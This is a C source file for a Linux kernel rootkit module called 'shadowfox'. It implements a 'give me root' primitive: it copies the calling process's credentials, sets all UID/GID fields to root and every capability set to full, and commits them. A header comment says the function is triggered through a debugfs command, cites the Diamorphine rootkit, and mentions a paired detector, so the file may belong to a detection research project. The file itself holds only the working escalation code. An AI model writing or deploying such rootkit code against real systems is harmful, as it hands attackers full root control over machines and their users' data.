// SPDX-License-Identifier: GPL-2.0
/*
 * shadowfox: privilege-escalation helper.
 *
 * The classical "give me root" rootkit primitive. We deliberately do
 * NOT use prepare_kernel_cred(NULL) — that path was reworked in
 * 6.5+ (commit 5af43c24ca59 and friends) and its semantics differ
 * across point releases. Instead we duplicate the current task's
 * cred with prepare_creds() and stomp only the privilege-relevant
 * fields. This preserves things we do not want to disturb (fs root,
 * namespace pointers, audit context) while flipping UID/GID and the
 * capability sets to root values.
 *
 * Both prepare_creds() and commit_creds() are EXPORT_SYMBOL'd in
 * 6.6, so this file has no kallsyms work to do.
 *
 * loginuid is NOT on struct cred — it lives on struct task_struct
 * and is updated only by the audit subsystem via PAM/login. The
 * kernel never touches it during a commit_creds() call. That
 * asymmetry is exactly what the paired lighthouse detector
 * (detect_cred.c) exploits.
 *
 * Reference: Diamorphine (m0nad) implements the same primitive
 * behind a magic-signal trigger. shadowfox exposes it through
 * debugfs (the "escalate" command on /sys/kernel/debug/shadowfox/ctl)
 * so that no syscall hook is required at this stage.
 */

#define pr_fmt(fmt) KBUILD_MODNAME ": " fmt

#include <linux/capability.h>
#include <linux/cred.h>
#include <linux/errno.h>
#include <linux/printk.h>
#include <linux/sched.h>
#include <linux/uidgid.h>

#include "cred.h"

int sf_escalate_current(void)
{
	struct cred *new;

	new = prepare_creds();
	if (!new)
		return -ENOMEM;

	/* Real, effective, saved, and fs UID/GID — all four pairs. */
	new->uid   = GLOBAL_ROOT_UID;
	new->euid  = GLOBAL_ROOT_UID;
	new->suid  = GLOBAL_ROOT_UID;
	new->fsuid = GLOBAL_ROOT_UID;
	new->gid   = GLOBAL_ROOT_GID;
	new->egid  = GLOBAL_ROOT_GID;
	new->sgid  = GLOBAL_ROOT_GID;
	new->fsgid = GLOBAL_ROOT_GID;

	/*
	 * Full capability set. cap_bset is the bounding set — a cap
	 * not present here cannot ever be acquired by this process or
	 * its descendants, so it must be set for the elevation to be
	 * meaningful. cap_ambient is preserved across exec only if its
	 * bits are also in cap_inheritable & cap_permitted.
	 */
	new->cap_inheritable = CAP_FULL_SET;
	new->cap_permitted   = CAP_FULL_SET;
	new->cap_effective   = CAP_FULL_SET;
	new->cap_bset        = CAP_FULL_SET;
	new->cap_ambient     = CAP_FULL_SET;

	pr_info("escalating pid=%d comm=%s to root\n",
		current->pid, current->comm);

	/*
	 * commit_creds() consumes `new` (takes ownership). After this
	 * call we must not touch `new` again — on success it has been
	 * installed on current, on failure it has been freed.
	 */
	commit_creds(new);
	return 0;
}
